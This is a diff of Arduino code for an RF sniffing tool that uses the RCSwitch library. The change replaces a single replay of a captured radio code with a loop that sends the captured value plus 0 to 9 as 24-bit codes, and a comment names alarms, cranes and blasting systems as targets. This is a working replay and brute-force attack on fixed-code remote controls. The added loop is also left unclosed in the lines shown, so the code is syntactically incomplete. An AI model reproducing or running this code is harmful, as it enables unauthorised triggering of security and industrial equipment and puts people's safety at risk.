@@ -51,15 +51,13 @@ void process_rf_value(RCSwitch rfswitch)
         Serial.println(F("[O] Sending back the packet sniffed in 1 second..."));
         delay(1000);
         Serial.println(F("[O] BOOOM!"));
-        rfswitch.send(value, rfswitch.getReceivedBitlength());
-        //rfswitch.send(value+1, rfswitch.getReceivedBitlength()); //### PoC
-        //delay(1000);
-//        for (int i = 0; i <= 11; i++) {
-//                  rfswitch.send(value + i, 24);
-//                  Serial.print(F("Fuzzing: "));
-//                  Serial.println(value + i);
-//                  delay(500);
-//                }
+        //rfswitch.send(value, rfswitch.getReceivedBitlength());
+        for (int i = 0; i <= 9; i++) { 
+            delay(1500);
+            Serial.print(F("Sending: "));
+            Serial.println(value + i);
+            rfswitch.send(value + i, 24); //24bit Alarms, Crane, Blasting System
+            //rfswitch.send(value + i, rfswitch.getReceivedBitlength()); //auto-finder bits lenght payload
         Serial.println(F("[O] Packets Sent!"));
         Serial.println(F("-----------------------------------------------------------------------------------------------------"));
         // reset the switch to allow more data to come
